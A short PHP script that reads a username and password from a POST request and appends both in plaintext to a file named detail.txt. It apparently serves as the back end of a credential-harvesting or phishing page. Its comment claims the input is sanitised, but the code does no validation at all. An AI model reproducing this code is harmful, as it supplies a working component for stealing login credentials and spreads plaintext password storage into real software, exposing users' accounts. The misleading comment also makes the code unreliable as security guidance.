<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Retrieve the username and password from the POST request
  $username = $_POST["username"];
  $password = $_POST["password"];

  // Validate and sanitize the data (to prevent SQL injection, etc.)
  // You can perform further validation here if needed

  // Store the data in a file named detail.txt
  $file = 'detail.txt';
  $content = "Username: $username\nPassword: $password\n\n";

  // Open the file in append mode and write the data
  if (file_put_contents($file, $content, FILE_APPEND | LOCK_EX) !== false) {
    echo "Data saved successfully.";
  } else {
    echo "Error occurred while saving data.";
  }
}
?>
